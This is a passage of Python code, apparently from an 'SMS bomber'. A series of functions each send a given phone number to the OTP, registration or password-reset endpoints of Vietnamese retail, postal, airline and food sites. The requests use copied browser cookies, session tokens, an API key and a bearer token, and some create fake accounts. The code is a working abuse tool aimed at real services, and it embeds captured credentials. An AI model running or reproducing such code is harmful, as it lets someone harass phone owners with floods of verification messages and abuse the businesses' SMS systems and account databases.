    '_asm_ss_view': '%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D',
    '_ga_48P0WR3P2C': 'GS1.1.1720626062.1.1.1720626086.36.0.0',
    'private_content_version': '5e3e65678616f3e49864dce16d1f43de',
    'section_data_ids': '{}',
    '_pk_id.564990520.6493': '1550063352.1720626062.1.1720626136.1720626062.',
    '_ac_client_id': '1550063352.1720626132',
    '_ac_an_session': 'zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624',
    'cdp_blocked_sid_17509314': 'true',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=023c4d0e7b15edc71f14f346ff4ef829; form_key=KELcFD4RySb6WQsc; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=KELcFD4RySb6WQsc; _fbp=fb.1.1720626061882.764993913589523922; _pk_ses.564990520.6493=*; _gcl_gs=2.1.k1$i1720626054; _gcl_au=1.1.676093199.1720626062; au_id=1550063352; _ac_au_gt=1720626058223; _ga=GA1.1.42709150.1720626062; _gcl_aw=GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE; cdp_session=1; _asm_visitor_type=r; mst-cache-warmer-track=1720626075588; _asm_ss_view=%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D; _ga_48P0WR3P2C=GS1.1.1720626062.1.1.1720626086.36.0.0; private_content_version=5e3e65678616f3e49864dce16d1f43de; section_data_ids={}; _pk_id.564990520.6493=1550063352.1720626062.1.1720626136.1720626062.; _ac_client_id=1550063352.1720626132; _ac_an_session=zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624; cdp_blocked_sid_17509314=true',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6ImQ0YmU4OTUwMTY5YzFjM2IiLCJ0ciI6ImMzNzBjYzJiZTc1ZmQ0OGJmZTJjNDQ4YmM1MWIwMzI2IiwidGkiOjE3MjA2MjYyNzE1NTIsInRrIjoiMTMyMjg0MCJ9fQ==',
    'origin': 'https://hoang-phuc.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://hoang-phuc.com/customer/account/create/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-c370cc2be75fd48bfe2c448bc51b0326-d4be8950169c1c3b-01',
    'tracestate': '1322840@nr=0-1-4173019-1120237972-d4be8950169c1c3b----1720626271552',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'action_type': '1',
    'tel': phone,
}

    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
def fm(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://fm.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fm.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
    'x-emp': '',
    'x-fromweb': 'true',
    'x-requestid': '9a563626-1886-40ce-a5b2-99971fd53161',
}

    json_data = {
    'Phone': phone,
    'LatOfMap': '106',
    'LongOfMap': '108',
    'Browser': '',
}

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
def vtpost(phone):
    cookies = {
    '_gid': 'GA1.2.620335128.1720627303',
    '_gat_gtag_UA_128396571_2': '1',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY',
    '_ga_9NGCREH08E': 'GS1.1.1720627303.1.0.1720627304.59.0.0',
    '_gat_gtag_UA_146347905_1': '1',
    '_gat_gtag_UA_142538724_1': '1',
    '_ga_7RZCEBC0S6': 'GS1.1.1720627304.1.1.1720627306.0.0.0',
    '_ga_WN26X24M50': 'GS1.1.1720627305.1.1.1720627306.0.0.0',
    '_ga': 'GA1.1.278441667.1720627303',
    '_ga_P86KBF64TN': 'GS1.1.1720627305.1.1.1720627319.0.0.0',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0',
    'Origin': 'null',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'FormRegister.FullName': 'Taylor Jasmine',
    'FormRegister.Phone': phone,
    'FormRegister.Password': 'vjyy1234',
    'FormRegister.ConfirmPassword': 'vjyy1234',
    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
    'ConfirmOtpType': 'Register',
    'FormRegister.IsRegisterFromPhone': 'true',
    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ',
}

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
def shine(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://30shine.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://30shine.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
}

    response = requests.post(
    'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
    headers=headers,
    json=json_data,
)
def dkimu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'name': 'hà khải',
    'phone': phone,
    'password': 'Vjyy1234@',
    'confirm_password': 'Vjyy1234@',
    'firstname': None,
    'lastname': None,
    'verify_otp': 0,
    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'email': 'dđ@gmail.com',
    'birthday': '2006-02-13',
    'accept_the_terms': 1,
    'receive_promotion': 1,
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data)
def otpmu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
    'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
    'source': 'web_consumers',
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)

def vina(phone):
    cookies = {
    '_gcl_au': '1.1.998139933.1720624574',
    '_ga': 'GA1.1.50287730.1720624578',
    '_fbp': 'fb.2.1720624579398.521085014509551541',
    '_tt_enable_cookie': '1',
    '_ttp': 'KSqjH4dgnlCZCXFrW8iH9-PBbVv',
    '_gcl_gs': '2.1.k1$i1720624593',
    '_gcl_aw': 'GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE',
    '_hjSessionUser_2067180': 'eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==',
    'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa',
    '_hjSession_2067180': 'eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
    '_clck': '1sxln5m%7C2%7Cfni%7C0%7C1652',
    '__cf_bm': 'lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA',
    'builderSessionId': '7b564e5635c64aa4b60d611b650e05b4',
    'sca_fg_codes': '[]',
    'avadaIsLogin': '',
    '_ga_6NH1HJ4MRS': 'GS1.1.1721111594.2.1.1721111671.44.0.0',
    '_clsk': '1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer null',
    'cache-control': 'no-cache',
    'content-type': 'text/plain;charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.998139933.1720624574; _ga=GA1.1.50287730.1720624578; _fbp=fb.2.1720624579398.521085014509551541; _tt_enable_cookie=1; _ttp=KSqjH4dgnlCZCXFrW8iH9-PBbVv; _gcl_gs=2.1.k1$i1720624593; _gcl_aw=GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE; _hjSessionUser_2067180=eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==; ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa; _hjSession_2067180=eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _clck=1sxln5m%7C2%7Cfni%7C0%7C1652; __cf_bm=lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA; builderSessionId=7b564e5635c64aa4b60d611b650e05b4; sca_fg_codes=[]; avadaIsLogin=; _ga_6NH1HJ4MRS=GS1.1.1721111594.2.1.1721111671.44.0.0; _clsk=1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
    'origin': 'https://new.vinamilk.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://new.vinamilk.com.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = '{"type":"register","phone":"' + phone + '"}'

    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
def air(phone):
    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={phone}'
    
    cookies = {
        '_gcl_au': '1.1.515899722.1720625176',
        '_tt_enable_cookie': '1',
        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
        '_fbp': 'fb.2.1720625180842.882992170348492798',
        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
        '_gid': 'GA1.3.1511312052.1721112193',
        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
        '_ga': 'GA1.1.186819165.1720625180',
        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': referer_url,
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': phone,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data)
def fa(phone):
    cookies = {
    'frontend': '2c83545216a746a78e9359eb6ed27b3d',
    '_ga': 'GA1.1.4630769.1721136088',
    '_gcl_au': '1.1.1971610675.1721136089',
    'frontend_cid': 'zNYnI9BV3h9Li12T',
    '_tt_enable_cookie': '1',
    '_ttp': 'yK0_Sao-5lepXIRR39-6N_UcfI2',
    '_fbp': 'fb.1.1721136099403.449285731186677163',
    '_clck': '1n4uxir%7C2%7Cfni%7C0%7C1658',
    'moe_uuid': '3aa3f66c-847f-4fcc-988c-f4d857f0a073',
    'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D',
    'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    'OPT_IN_SHOWN_TIME': '1721136125365',
    'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    '_clsk': '169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect',
    'SESSION': '%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D',
    '_ga_460L9JMC2G': 'GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'frontend=2c83545216a746a78e9359eb6ed27b3d; _ga=GA1.1.4630769.1721136088; _gcl_au=1.1.1971610675.1721136089; frontend_cid=zNYnI9BV3h9Li12T; _tt_enable_cookie=1; _ttp=yK0_Sao-5lepXIRR39-6N_UcfI2; _fbp=fb.1.1721136099403.449285731186677163; _clck=1n4uxir%7C2%7Cfni%7C0%7C1658; moe_uuid=3aa3f66c-847f-4fcc-988c-f4d857f0a073; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1721136125365; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; _clsk=169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect; SESSION=%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D; _ga_460L9JMC2G=GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
    'origin': 'https://www.fahasa.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-13c9c10c4d525aad8d0528fa3b7fd940-866a99283e198658-01',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
}

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
def sms3(phone):
    headers = {
        'authority': 'kingme.pro',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
        'dnt': '1',
        'origin': 'https://kingme.pro',
        'referer': 'https://kingme.pro/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
